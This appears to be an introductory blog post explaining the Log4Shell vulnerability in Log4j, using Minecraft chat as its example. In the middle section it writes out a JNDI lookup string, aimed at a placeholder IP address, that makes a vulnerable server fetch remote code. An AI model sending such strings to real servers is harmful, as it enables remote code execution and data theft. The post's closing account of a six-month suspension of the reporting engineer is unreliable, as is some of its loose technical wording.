## Introduction

If you're into cybersecurity even a little bit, you probably have heard about
the recent, groundbreaking exploit: **Log4Shell**. The threat is considered
catastrophic by the cybersecurity community because of the vast number of devices that use the library.
Before we understand the exploit and why we should be worried, let's first understand 
the **Log4j** library. 

*I suggest reading the overview if you continue to the technical 
explanation.*

## Overview

**Log4j** is a tool to help developers monitor and debug software in order
to ensure everything runs smoothly. It logs a ton of information and the main
purpose is to store the information somewhere like a server. The purpose of this
library should be to *just* store information, but what if we can trick the server
 to execute code?

The vulnerability within Log4j is known as **Log4shell**. To better understand this vulnerability, let's discuss how it was discovered. Minecraft
uses Log4j for debugging and essentially logs the events as the 
application is running. If the game were to crash, Log4j would be able to see 
when and what process may have caused it. It can also keep track of the messages sent by
the players which is logged to the server (see where the vulnerability can be?).

An injection attack is a type of attack where the attacker inputs a message followed by
a command that injects a malicious program into the server.
By utilizing an injection attack which is just tricking the server to execute code from the
attacker, malicious code can be executed on the server which can grant the attacker
unauthorized access and more. The attacker can have access to sensitive information on the server
as well as even admin privileges to do as they please.


## How It Works
Now for the more in-depth discussion. **Log4j** is a popular monitoring framework written in Java and is used to log 
data. I think the non-technical explanation pretty much covers it, so I'll jump right 
into the vulnerability.

Going back to the Minecraft example, Log4j works with the Java Naming and
Directory Interface (JNDI) API which allows developers to connect their programs with
external directories. Lightweight Directory Access Protocol (LDAP) is the tool used to essentially connect
everything which is used by JNDI. 

The following command can be pasted into the chat to perform the injection:
`${jndi:ldap://ip_address/malicious_code()`. That's really it. A command sent through the
chat can allow attackers to execute any code on the host's server.

Over the past few weeks, hosts of popular Minecraft servers have been hacked through this exploit. Sensitive information
and credentials were hijacked because it was possible to use this attack on the client. Although simple, this attack
demonstrates why companies and software that use Log4j have been causing an uproar.

Be sure to check the references for the video that demonstrates
the attack. John Hammond also does a really in-depth video with the exploit on both Minecraft and a TryHackMe Lab 
which are both at the bottom as well.

## What Now?

The patch is out, but Log4j is used by a *ton* of companies around the world which is 
why this exploit is so critical. It's up to the teams in charge of the
technology to update the version in order to avoid falling victim to this attack. It 
was fortunate that such a vulnerability was discovered because an exploit like this
is surely to be maliciously used by organizations and governments.

As a matter of fact, the Chinese government actually dicisplined a group 
for not reporting Log4shell to them first. The cybersecurity engineer to report the flaw
was suspended of work for six months. As always, be sure to check the references for the full
report.
